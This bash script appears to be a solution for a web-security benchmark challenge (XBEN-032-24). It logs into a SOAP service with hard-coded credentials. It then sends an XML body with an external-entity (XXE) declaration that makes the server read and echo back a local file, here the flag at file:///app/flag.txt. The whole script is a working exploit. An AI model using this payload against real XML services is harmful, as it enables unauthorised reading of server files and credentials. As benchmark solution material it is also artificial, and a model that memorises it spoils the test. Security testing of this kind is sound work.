#!/usr/bin/env bash
# XBEN-032-24 — XXE in a SOAP/XML service. Proxy-mode twin. Log in, then POST an
# XML body that declares an external entity pointing at the flag file; the
# service expands it into the account_id it echoes back.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-file:///app/flag.txt}"
SESSION="xben032p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/login"; BASE="$(req_of GET login)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
body='<?xml version="1.0"?>'"<!DOCTYPE r [<!ENTITY xxe SYSTEM \"$FILE\">]>"'<GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/login' --set 'form.username=john' --set 'form.password=password123' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/soap_service' \
  --set 'header.Content-Type=application/xml' --set "body.raw=$body" >/dev/null
print_flag
